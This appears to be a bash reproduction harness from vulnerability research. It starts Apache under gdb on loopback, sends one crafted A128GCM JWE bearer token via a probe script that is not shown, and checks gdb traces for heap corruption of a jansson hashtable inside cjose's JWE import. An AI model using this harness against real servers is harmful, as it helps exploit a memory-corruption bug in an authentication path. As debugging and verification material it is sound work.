#!/bin/bash
# W220 second measurement: follow the corrupted jansson hashtable from
# cjose_jwe_import() into the post-unwrap header lookup. One crafted A128GCM
# bearer request, fresh gdb-started Apache, loopback 127.0.0.1:18444 only.
set -eu
T=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
W2=$(CDPATH= cd -- "$T/.." && pwd)
GDBPIDS=""
PASS=0
FAIL=0
mkdir -p "$T/evidence" "$T/run" "$T/cache" "$T/html"
sed -e "s|@W2@|$W2|g" -e "s|@T@|$T|g" "$T/apache-w219.conf" > "$T/apache-vuln.run.conf"
sed "s|@LOG@|$T/evidence/gdb-w220-use.log|" "$T/gdb-w220-use.cmd" > "$T/gdb-w220-use.run.cmd"

cleanup() {
    if [ -f "$T/apache.pid" ]; then kill "$(cat "$T/apache.pid")" 2>/dev/null || true; rm -f "$T/apache.pid"; fi
    for p in $GDBPIDS; do kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true; done
}
trap cleanup EXIT INT TERM
check() {
    if [ "$2" = "$3" ]; then PASS=$((PASS + 1)); else FAIL=$((FAIL + 1)); fi
    printf 'CHECK %-26s observed=%s expected=%s\n' "$1" "$2" "$3"
}
atleast() {
    if [ "$2" -ge "$3" ]; then PASS=$((PASS + 1)); else FAIL=$((FAIL + 1)); fi
    printf 'CHECK %-26s observed=%s minimum=%s\n' "$1" "$2" "$3"
}

[ "$(ss -ltn | grep -cE ':18444 ' || true)" -eq 0 ] || { echo PORTS_BUSY >&2; exit 3; }
timeout 90 gdb -q -batch -x "$T/gdb-w220-use.run.cmd" --args /usr/sbin/apache2 -f "$T/apache-vuln.run.conf" -X > "$T/evidence/stdout-w220-use.log" 2>&1 &
GDBPIDS="$!"
for i in $(seq 1 200); do
    if ss -ltn | grep -q ':18444 '; then break; fi
    sleep 0.2
done
ss -ltn | grep -q ':18444 ' || { echo LISTENER_NOT_READY >&2; exit 2; }
W2_PORT=18444 W2_TAG=w220-use timeout 30 python3 "$T/probe-w219b.py" long \
    > "$T/evidence/probe-w220-use.log" 2>&1 || echo PROBE_FAILED >> "$T/evidence/probe-w220-failures.log"
sleep 2
for p in $GDBPIDS; do kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true; done
GDBPIDS=""
sleep 1

L="$T/evidence/gdb-w220-use.log"
P="$T/evidence/probe-w220-use.log"
check KW_REACHED "$(grep -c 'W220_KW_DECRYPT raw_len=176 cek_len=0 jwk_kty=3' "$L" || true)" 1
check POST_UNWRAP "$(grep -c 'W220_POST_UNWRAP cek=0x555555667170 cek_len_before=16' "$L" || true)" 1
atleast IMPORT_HDR "$(grep -c 'W220_IMPORT_HDR ' "$L" || true)" 1
atleast DECRYPT_DAT "$(grep -c 'W220_DECRYPT_DAT ' "$L" || true)" 1
atleast HASHTABLE_GET "$(grep -c 'W220_HASHTABLE_GET ' "$L" || true)" 1
atleast FIND_PAIR "$(grep -c 'W220_FIND_PAIR ' "$L" || true)" 1
check HTTP401 "$(grep -c '401 Unauthorized' "$P" || true)" 1
atleast JSON_GET "$(grep -c 'W220_JSON_GET ' "$L" || true)" 1
check CLOBBERED_TYPE "$(grep -c 'W220_JSON_GET json=0x555555667190 type_word=4702111234474983745' "$L" || true)" 1
check NO_SIGNAL "$(grep -c 'Program received signal' "$L" || true)" 0
IH=$(grep -m1 'W220_IMPORT_HDR ' "$L" | sed -n 's/.*hdr=\(0x[0-9a-f]*\).*/\1/p' || true)
DH=$(grep -m1 'W220_DECRYPT_DAT ' "$L" | sed -n 's/.*hdr=\(0x[0-9a-f]*\).*/\1/p' || true)
printf 'W220 header identity: import=%s decrypt_dat=%s\n' "$IH" "$DH"
[ -n "$IH" ] && [ "$IH" = "$DH" ] && PASS=$((PASS + 1)) || FAIL=$((FAIL + 1))
printf 'W220 hashtable lookups:\n'
grep 'W220_HASHTABLE_GET ' "$L" || true
printf 'REPLAY_W220_USE: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
ss -ltn | grep -E ':18444 ' || echo NO_LISTENER_LEFT
[ "$FAIL" -eq 0 ]
